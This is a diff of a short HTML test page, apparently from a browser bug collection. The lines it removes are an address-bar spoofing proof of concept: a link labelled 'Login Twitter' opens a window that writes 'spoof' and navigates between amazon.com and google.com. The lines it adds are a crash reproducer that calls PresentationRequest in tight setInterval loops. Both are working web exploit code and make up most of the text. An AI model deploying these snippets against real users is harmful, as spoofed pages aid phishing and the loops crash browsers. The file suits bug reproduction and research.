@@ -1,13 +1,31 @@
 
-<script>
-  function next() {
-         w.location.replace('http://www.google.com/csi');
-        }
 
-  function f() {
-    w = window.open("javascript:document.write('spoof');location='http://amazon.com'","new","width=500 height=500");
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
+<!DOCTYPE html>
+<html>
+<meta charset="utf-8">
+
+<body>
+<button id="button_fuzz" onclick="start()">start</button>
+
+
+</body>
+
+<script>
+setTimeout('location.href = "#hello"', 10)
+function start() {
+setInterval("qPresentation1 = new PresentationRequest(['receiver/index.html']);qPresentation1.start().then(q=>{}).catch(q=>{})", 1)
+setInterval(function(){crash()}, 10)
+
+}
+
+
+function crash() {
+setInterval("qPresentation1 = new PresentationRequest(['receiver/index.html']);qPresentation1.start().then(q=>{}).catch(q=>{})", 1);
+
+
+}
+
+
 </script>
 
-<a href="#" onclick="f()">Login Twitter</a>
+</html>
